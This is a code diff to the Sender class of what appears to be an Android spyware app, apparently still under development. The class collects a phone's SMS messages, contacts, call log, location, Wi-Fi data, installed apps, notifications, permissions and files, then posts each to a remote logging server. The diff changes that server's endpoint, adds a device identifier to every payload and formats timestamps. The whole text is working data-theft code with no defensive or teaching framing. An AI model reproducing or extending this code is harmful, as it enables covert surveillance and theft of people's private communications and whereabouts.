@@ -18,7 +18,7 @@ import java.util.Calendar;
 
 public class Sender extends AsyncTask<String, Void, String> {
 
-    public static String baseUrl = "http://192.168.0.111:5000/api/log/";
+    public static String baseUrl = "http://192.168.0.111:5000/api/logger/";
 
     @Override
     protected String doInBackground(String... strings) {
@@ -61,7 +61,14 @@ public class Sender extends AsyncTask<String, Void, String> {
 
     public static void send(JSONObject toSend) {
         try {
-            toSend.put("date", Calendar.getInstance().getTime().toString());
+            toSend.put(
+                    "date",
+                    android.text.format.DateFormat.format(
+                            "yyyy-MM-dd HH:mm:ss",
+                            Calendar.getInstance().getTime()
+                    )
+            );
+            toSend.put("deviceId", MainService.id);
             new Sender().execute(toSend.toString());
         } catch (JSONException ex) {
             ex.printStackTrace();
@@ -74,13 +81,11 @@ public class Sender extends AsyncTask<String, Void, String> {
 
     public static boolean sendWifi() {
         try {
-            showMsg("Wifi processing");
+            showMsg("Wifi send");
             JSONObject data = new JSONObject();
             data.put("type", "wifi");
             data.put("value", Wifi.get());
-            showMsg("Wifi sending");
             send(data);
-            showMsg("Wifi processed");
         } catch (Exception ex) {
             ex.printStackTrace();
             showMsg("Wifi failed");
@@ -92,13 +97,11 @@ public class Sender extends AsyncTask<String, Void, String> {
 
     public static boolean sendSms() {
         try {
-            showMsg("Sms processing");
+            showMsg("Sms send");
             JSONObject data = new JSONObject();
             data.put("type", "sms");
             data.put("value", Sms.get());
-            showMsg("Sms sending");
             send(data);
-            showMsg("Sms processed");
         } catch (Exception ex) {
             ex.printStackTrace();
             showMsg("Sms failed");
@@ -110,13 +113,11 @@ public class Sender extends AsyncTask<String, Void, String> {
 
     public static boolean sendPermissions() {
         try {
-            showMsg("Permissions processing");
+            showMsg("Permissions send");
             JSONObject data = new JSONObject();
             data.put("type", "granted_permission");
             data.put("value", Permissions.getGranted());
-            showMsg("Permissions sending");
             send(data);
-            showMsg("Permissions processed");
         } catch (Exception ex) {
             ex.printStackTrace();
             showMsg("Permissions failed");
@@ -128,13 +129,11 @@ public class Sender extends AsyncTask<String, Void, String> {
 
     public static boolean sendNotification(JSONObject notification) {
         try {
-            showMsg("Notification processing");
+            showMsg("Notification send");
             JSONObject data = new JSONObject();
             data.put("type", "notification");
             data.put("value", notification);
-            showMsg("Notification sending");
             send(data);
-            showMsg("Notification processed");
         } catch (Exception ex) {
             ex.printStackTrace();
             showMsg("Notification failed");
@@ -146,16 +145,14 @@ public class Sender extends AsyncTask<String, Void, String> {
 
     public static boolean sendLocation() {
         try {
+            showMsg("Location send");
             Context context = MainService.getContext();
             Locations gps = new Locations(context);
             if (gps.isCanGetLocation()) {
-                showMsg("Location processing");
                 JSONObject data = new JSONObject();
                 data.put("type", "location");
                 data.put("value", gps.get());
-                showMsg("Location sending");
                 send(data);
-                showMsg("Location processed");
             }
         } catch (Exception ex) {
             ex.printStackTrace();
@@ -168,13 +165,11 @@ public class Sender extends AsyncTask<String, Void, String> {
 
     public static boolean sendContacts() {
         try {
-            showMsg("Contacts processing");
+            showMsg("Contacts send");
             JSONObject data = new JSONObject();
             data.put("type", "contact");
             data.put("value", Contacts.get());
-            showMsg("Contacts sending");
             send(data);
-            showMsg("Contacts processed");
         } catch (Exception ex) {
             ex.printStackTrace();
             showMsg("Contacts failed");
@@ -186,13 +181,11 @@ public class Sender extends AsyncTask<String, Void, String> {
 
     public static boolean sendCalls() {
         try {
-            showMsg("Calls processing");
+            showMsg("Calls send");
             JSONObject data = new JSONObject();
             data.put("type", "call");
             data.put("value", Calls.get());
-            showMsg("Calls sending");
             send(data);
-            showMsg("Calls processed");
         } catch (Exception ex) {
             ex.printStackTrace();
             showMsg("Calls failed");
@@ -204,14 +197,12 @@ public class Sender extends AsyncTask<String, Void, String> {
 
     public static boolean sendApps(boolean isWithSystemApps) {
         try {
-            showMsg("Apps processing");
+            showMsg("Apps send");
             JSONObject data = new JSONObject();
             data.put("type", "app");
             data.put("isWithSystemApps", isWithSystemApps);
             data.put("value", Apps.get(isWithSystemApps));
-            showMsg("Apps sending");
             send(data);
-            showMsg("Apps processed");
         } catch (Exception ex) {
             ex.printStackTrace();
             showMsg("Apps failed");
@@ -223,11 +214,8 @@ public class Sender extends AsyncTask<String, Void, String> {
 
     public static boolean sendError(JSONObject data) {
         try {
-            showMsg("Error processing");
             data.put("type", "error");
-            showMsg("Error sending");
             send(data);
-            showMsg("Error processed");
         } catch (Exception ex) {
             ex.printStackTrace();
             showMsg("Error failed");
@@ -239,11 +227,8 @@ public class Sender extends AsyncTask<String, Void, String> {
 
     public static boolean sendFile(JSONObject data) {
         try {
-            showMsg("File( processing");
             data.put("type", "file");
-            showMsg("File( sending");
             send(data);
-            showMsg("File( processed");
         } catch (Exception ex) {
             ex.printStackTrace();
             showMsg("File( failed");
